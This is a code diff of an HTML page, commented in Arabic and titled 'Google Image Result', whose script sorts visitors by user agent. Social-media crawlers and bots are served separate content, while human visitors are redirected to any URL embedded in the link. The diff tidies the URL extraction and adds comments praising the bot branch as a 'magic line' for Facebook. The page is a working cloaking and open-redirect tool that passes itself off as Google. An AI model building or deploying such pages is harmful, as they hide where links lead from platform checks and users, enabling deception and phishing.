@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -6,15 +5,23 @@
     <title>Google Image Result</title>
     
     <script>
-        // بيقرا الرابط الطويل اللي المتابع ضغط عليه
+        // بنقرا الرابط كاملاً بالمسار أو الـ Hash أو أي حاجة بعد الدومين
         let fullPath = window.location.href;
-        let splitIndex = fullPath.indexOf("http", 8); 
-        let targetUrl = splitIndex !== -1 ? fullPath.substring(splitIndex) : "https://images.app.goo.gl/UeieYqv4rGmwTHg9A";
+        
+        // لو الرابط فيه # أو مسار، بنستخرج رابط الصورة المستهدف
+        let targetUrl = "";
+        if (fullPath.includes("http", 8)) {
+            let splitIndex = fullPath.indexOf("http", 8);
+            targetUrl = fullPath.substring(splitIndex);
+        } else {
+            targetUrl = "https://images.app.goo.gl/UeieYqv4rGmwTHg9A";
+        }
 
         let userAgent = navigator.userAgent || "";
         let isBot = /facebookexternalhit|Facebot|Twitterbot|Googlebot|LinkedInBot|WhatsApp|Bluesky|MetaInspector|bot|crawler|spider|scraper/i.test(userAgent);
 
         if (isBot) {
+            // السطر السحري بتاعك للبوتات وفيسبوك
             document.write(`
                 <!DOCTYPE html>
                 <html lang="ar">
@@ -31,6 +38,7 @@
                 </html>
             `);
         } else {
+            // تحويل الزائر العادي للصورة فوراً
             window.location.replace(targetUrl);
         }
     </script>
